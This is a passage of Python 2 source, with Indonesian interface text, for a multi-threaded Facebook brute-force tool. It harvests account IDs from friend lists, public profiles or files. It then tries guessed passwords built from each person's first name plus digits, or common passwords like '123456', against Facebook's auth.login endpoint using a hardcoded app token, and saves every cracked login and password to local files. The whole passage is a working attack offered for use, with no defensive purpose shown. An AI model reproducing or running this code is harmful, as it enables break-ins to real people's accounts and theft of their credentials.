							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/post.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/post.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('123456')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/post.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/post.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'123'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/post.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/post.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/post.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/post.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'1234'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/post.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/post.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone post.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	
	### Japan ###
def crack_japan():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;97m _________   \033[1;91m _____\033[1;97m___.    "
	print "\033[1;97m \_   ___ \ \033[1;91m_/ ____\033[1;97m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;97m /    \  \/ \033[1;91m\   __\ \033[1;97m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;97m \     \____ \033[1;91m|  |  \033[1;97m | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;97m  \______  / \033[1;91m|__|  \033[1;97m |___  /"
	print "\033[1;97m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m─────────────────────\033[1;97m(\033[1;93mJapan\033[1;97m)\033[1;94m──────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_japan()

#### PILIH japan####
def pilih_japan():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_japan()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;97m _________   \033[1;91m _____\033[1;97m___.    "
		print "\033[1;97m \_   ___ \ \033[1;91m_/ ____\033[1;97m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;91m\   __\ \033[1;97m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;91m|  |  \033[1;97m | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;91m|__|  \033[1;97m |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("              \033[1;94m>>> \033[1;93mCRACK JAPAN \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;97m _________   \033[1;91m _____\033[1;97m___.    "
		print "\033[1;97m \_   ___ \ \033[1;91m_/ ____\033[1;97m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;91m\   __\ \033[1;97m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;91m|  |  \033[1;97m | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;91m|__|  \033[1;97m |___  /"
		print "\033[1;97m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("              \033[1;94m>>> \033[1;93mCRACK JAPAN \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_japan()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;97m _________   \033[1;91m _____\033[1;97m___.    "
		print "\033[1;97m \_   ___ \ \033[1;91m_/ ____\033[1;97m\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;97m /    \  \/ \033[1;91m\   __\ \033[1;97m| __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;97m \     \____ \033[1;91m|  |  \033[1;97m | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;97m  \______  / \033[1;91m|__|  \033[1;97m |___  /"
		print "\033[1;97m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("              \033[1;94m>>> \033[1;93mCRACK JAPAN \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_japan()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_japan()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN japan #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/japan.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/japan.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/japan.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/japan.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/japan.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/japan.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('Password')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/japan.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/japan.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('123456')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/japan.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/japan.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('123456')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/japan.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/japan.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/japan.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
